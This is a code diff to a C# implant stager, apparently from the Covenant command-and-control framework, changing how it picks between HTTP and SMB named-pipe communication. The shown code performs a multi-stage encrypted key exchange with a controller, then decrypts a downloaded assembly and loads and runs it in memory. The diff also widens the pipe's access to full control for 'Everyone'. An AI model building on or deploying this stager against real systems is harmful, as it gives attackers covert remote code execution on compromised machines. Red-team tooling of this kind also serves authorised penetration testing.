@@ -10,7 +10,7 @@ using System.Collections.Generic;
 using System.Security.Cryptography;
 using System.Text.RegularExpressions;
 
-namespace Grunt
+namespace GruntStager
 {
     public class GruntStager
     {
@@ -39,8 +39,7 @@ namespace Grunt
                 // {{REPLACE_PROFILE_HTTP_URLS}}
                 string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}";
                 string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}";
-                bool UsePipes = false;
-                bool.TryParse(@"{{REPLACE_USE_PIPES}}", out UsePipes);
+                string CommType = @"{{REPLACE_COMM_TYPE}}";
                 string PipeName = @"{{REPLACE_PIPE_NAME}}";
 
                 Random random = new Random();
@@ -75,12 +74,13 @@ namespace Grunt
                 NamedPipeServerStream pipe = null;
                 CookieWebClient wc = null;
                 string Stage0Response = "";
-                if (UsePipes)
+                if (CommType == "SMB")
                 {
                     PipeSecurity ps = new PipeSecurity();
-                    ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow));
+                    ps.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));
                     pipe = new NamedPipeServerStream(PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                     pipe.WaitForConnection();
+                    System.Threading.Thread.Sleep(5000);
                     var Stage0Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileHttpPostRequest, transformedResponse));
                     Write(pipe, Stage0Bytes);
                     Stage0Response = Encoding.UTF8.GetString(Read(pipe)).Replace("\"", "");
@@ -99,7 +99,6 @@ namespace Grunt
                 string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
                 extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
                 List<string> parsed = Parse(extracted, MessageFormat);
-                GUID = parsed[0];
                 string iv64str = parsed[3];
                 string message64str = parsed[4];
                 string hash64str = parsed[5];
@@ -126,7 +125,7 @@ namespace Grunt
                 transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));
 
                 string Stage1Response = "";
-                if (UsePipes)
+                if (CommType == "SMB")
                 {
                     var Stage1Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileHttpPostRequest, transformedResponse));
                     Write(pipe, Stage1Bytes);
@@ -140,7 +139,6 @@ namespace Grunt
                 extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
                 extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
-                GUID = parsed[0];
                 iv64str = parsed[3];
                 message64str = parsed[4];
                 hash64str = parsed[5];
@@ -163,7 +161,7 @@ namespace Grunt
                 transformedResponse = HttpMessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));
 
                 string Stage2Response = "";
-                if (UsePipes)
+                if (CommType == "SMB")
                 {
                     var Stage2Bytes = Encoding.UTF8.GetBytes(String.Format(ProfileHttpPostRequest, transformedResponse));
                     Write(pipe, Stage2Bytes);
@@ -177,7 +175,6 @@ namespace Grunt
                 extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
                 extracted = Encoding.UTF8.GetString(HttpMessageTransform.Invert(extracted));
                 parsed = Parse(extracted, MessageFormat);
-                GUID = parsed[0];
                 iv64str = parsed[3];
                 message64str = parsed[4];
                 hash64str = parsed[5];
@@ -187,7 +184,7 @@ namespace Grunt
                 SessionKey.IV = Convert.FromBase64String(iv64str);
                 byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                 Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
-                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { GUID, SessionKey, pipe });
+                gruntAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { GUID, SessionKey, pipe, PipeName });
             }
             catch (Exception e) { Console.Error.WriteLine(e.Message); }
         }
